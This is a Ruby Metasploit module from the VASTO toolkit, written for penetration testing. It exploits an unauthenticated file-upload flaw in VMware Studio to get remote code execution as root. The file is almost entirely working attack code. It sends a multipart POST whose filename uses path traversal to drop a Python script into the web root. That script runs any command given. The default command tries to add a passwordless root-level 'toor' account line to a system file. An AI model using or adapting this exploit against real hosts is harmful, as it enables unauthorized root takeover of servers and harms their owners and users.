#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################


require 'msf/core'
require "rexml/document"


class Metasploit3 < Msf::Auxiliary
  
  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient
  #include Msf::Auxiliary::WMAPScanServer
  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  
  def initialize
    super(
			'Name'        => 'VMware Studio < 2.0.0.946-172280 Remote Code Execution',
			'Version'     => '0.9',
			'Description' => '  This module exploits VMware Studio 2 Beta (<2.0.0.946-172280) vulnerability. It can upload any arbitrary file on the system, which can then be executed if they are python files. They will run as root on the system.',
			'Author'      => 'Claudio Criscione - c.criscione@securenetwork.it',
			'License'     =>  GPL_LICENSE
    )
      deregister_options('Proxies')
      deregister_options('VHOST')
      deregister_options('SSL')
      deregister_options('RPORT')    
    register_options(
      [
        OptPort.new('RPORT', [ true, "The target port", 5480 ]),
        OptBool.new('SSL', [ true, "Use SSL", true ]),
	OptString.new('FileName', [true, "Uploaded file name and path", "/opt/vmware/share/htdocs/rndupload.py"]),
	OptString.new('CMD', [true, "Command to execute", "echo 'toor::0:0:root:/root:/bin/bash'>> /etc/hosts"])
      ], Auxiliary::Scanner)    
   
  end
  
  def run_host(ip)
    begin
  		boundary = 'abcdef'
		
		data = "--#{boundary}\r\nContent-Disposition: form-data; name=\"servicetar\"; "
		data << "filename=/../../../../../" + datastore['FileName'] + "\r\nContent-Type: text/plain\r\n\r\n"
		data << "#/usr/bin/python \r\n"
		data << "import os \r\n"
		data << "os.system(\""+datastore['CMD']+"\") \r\n"

		data << "\r\n--#{boundary}--"

		res = send_request_raw({
			'uri'	  => "/service/depot/upload-tar.py",
			'method'  => 'POST',
			'vhost' => ip,
			'data'    => data,
			'headers' =>
			{
				'Content-Type'	 => 'multipart/form-data; boundary=' + boundary,
				'Content-Length' => data.length,
			}
		}, 25)

		print_status("Successfully uploaded "+datastore['FileName'])
		
		
    end    
  end
  
end
